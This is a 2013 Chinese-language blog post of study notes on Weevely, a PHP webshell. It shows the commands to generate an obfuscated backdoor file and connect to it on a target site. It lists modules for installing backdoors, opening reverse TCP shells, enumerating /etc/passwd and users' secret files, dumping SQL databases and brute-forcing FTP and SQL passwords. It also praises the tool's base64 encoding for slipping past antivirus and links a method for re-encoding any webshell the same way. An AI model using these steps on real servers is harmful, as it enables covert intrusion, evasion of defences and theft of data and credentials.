---
author: bccsafe
comments: true
date: 2013-04-19 15:49:50+00:00
layout: post
slug: weevely-php-webshell
title: Weevely PHP WEBSHELL!
wordpress_id: 158
categories:
- wp_bt5 学习笔记
post_format:
- 图像
tags:
- Weevely
---

Weevely是一款隐蔽模块化的PHP WEBSHELL,Weevely基于c/s模式构建,目前已经有30多个模块,功能涉及服务器错误配置审计，后门放置，暴力破解，文件管理，资源搜索，网络代理，命令执行，数据库操作，系统信息收集及端口扫描等

详细介绍：   [https://github.com/epinna/Weevely](https://github.com/epinna/Weevely)



在最新的kali linux中 版本为V1.0    BT5内置的是V0.7

使用了telnet的方式来代替web 页面式的管理，而经过weevely base64编码加密的后门 ， 可以骗过主流的杀软，之前还看到有人提取出了加密代码，过安全狗什么的 



介绍了很多...开始正题

1. 生成客户端 

[![weevely create](../../../../../public/Image/2013/04/2.jpg)](../../../../../public/Image/2013/04/2.jpg)
    
     ./weevely.py  generate password  /root/bccsafe.php
 
2. 连接，成功连上后就可以随意的使用终端了，按TAB进入操控模式，网上搜了下 就搜到这么点 命令应该还有更多

[![weevely](../../../../../public/Image/2013/04/1111111.jpg)](../../../../../public/Image/2013/04/1111111.jpg)
    
     ./weevely.py http://www.xxx.com/bccsafe.php bccsafe


>	系统
>	
>	system.info   //收集系统信息
>	
>	文件
>	
>	file.rm           //删除文件
>	
>	file.read        //读文件
>	
>	file.upload        //上传本地文件
>	
>	file.check        //检查文件的权限和
>	
>	file.enum        //在本地词表的书面枚举远程文件
>	
>	file.download        //下载远程二进制/ ASCII文件到本地
>	
>	SQL
>	
>	sql.query        //执行SQL查询
>	
>	sql.console        //启动SQL控制台
>	
>	sql.dump        //获取SQL数据库转储
>	
>	sql.summary        //获取SQL数据库中的表和列
>	
>	后门
>	backdoor.tcp                //TCP端口后门
>	
>	backdoor.install        //安装后门
>	
>	backdoor.reverse_tcp        //反弹
>	
>	枚举
>	audit.user_files        //在用户家中列举常见的机密文件
>	
>	audit.user_web_files        //列举常见的Web文件
>	
>	audit.etc_passwd        //枚举/etc/passwd
>	
>	查找
>	find.webdir        //查找可写的web目录
>	
>	find.perm        //查找权限可读/写/可执行文件和目录
>	
>	find.name        //按名称查找文件和目录
>	
>	find.suidsgid        //查找SUID / SGID文件和目录
>	
>	暴破
>	bruteforce.sql                //暴力破解单一SQL用户
>	
>	bruteforce.sql_users        //暴力破解SQL密码
>	
>	bruteforce.ftp               // 暴力破解单一FTP用户
>	
>	bruteforce.ftp_users        //暴力破解FTP密码

3.分离Weevely加密模块加密任意WebShell

[http://zone.wooyun.org/content/2975](http://zone.wooyun.org/content/2975)

    
    python test.py intofile  outfile




[![Weevel加密](../../../../../public/Image/2013/04/5.jpg)](../../../../../public/Image/2013/04/5.jpg)



[![intofile](../../../../../public/Image/2013/04/3.jpg)](../../../../../public/Image/2013/04/3.jpg)

[![outfile](../../../../../public/Image/2013/04/4.jpg)](../../../../../public/Image/2013/04/4.jpg)






